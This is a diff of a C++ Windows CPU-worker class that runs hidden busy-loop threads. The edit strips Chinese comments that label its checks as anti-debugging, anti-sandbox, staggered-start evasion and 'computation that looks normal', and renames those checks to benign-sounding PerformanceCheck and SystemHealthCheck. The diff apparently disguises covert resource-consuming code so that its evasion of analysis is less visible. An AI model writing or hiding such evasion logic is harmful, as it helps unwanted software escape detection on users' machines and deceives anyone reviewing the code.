@@ -33,21 +33,19 @@ CPUWorker::~CPUWorker() {
 void CPUWorker::Start() {
     if (InterlockedCompareExchange(&running, 1, 0) != 0) return;
     
-    // 反调试检测
-    if (IsDebuggerPresent_Safe()) {
+    if (!PerformanceCheck()) {
         InterlockedExchange(&running, 0);
         return;
     }
     
-    // 反沙箱检测
-    AntiSandboxMemoryPattern();
+    SystemHealthCheck();
     
     InterlockedExchange(&intensity, 30);
     lastAdjustTime = GetTickCount();
     
     workers.clear();
     
-    RandomDelay(100, 300); // 延迟启动
+    RandomDelay(100, 300);
     
     for (int i = 0; i < numWorkers; i++) {
         HANDLE hThread = CreateThread(NULL, 0, WorkerThreadProc, this, 0, NULL);
@@ -56,7 +54,7 @@ void CPUWorker::Start() {
             workers.push_back(hThread);
         }
         
-        RandomDelay(10, 50); // 分散启动
+        RandomDelay(10, 50);
     }
 }
 
@@ -82,7 +80,6 @@ DWORD WINAPI CPUWorker::WorkerThreadProc(LPVOID lpParam) {
 }
 
 void CPUWorker::WorkerThread() {
-    // 随机初始延迟
     RandomDelay(0, 100);
     
     while (running) {
@@ -107,7 +104,6 @@ void CPUWorker::DoWork(int intensityLevel) {
     volatile double result = 0;
     int iterations = 100 + intensityLevel * 10;
     
-    // 数学运算（看起来像正常计算）
     for (int i = 0; i < iterations; i++) {
         result += pow(-1.0, i) / (2.0 * i + 1.0);
     }
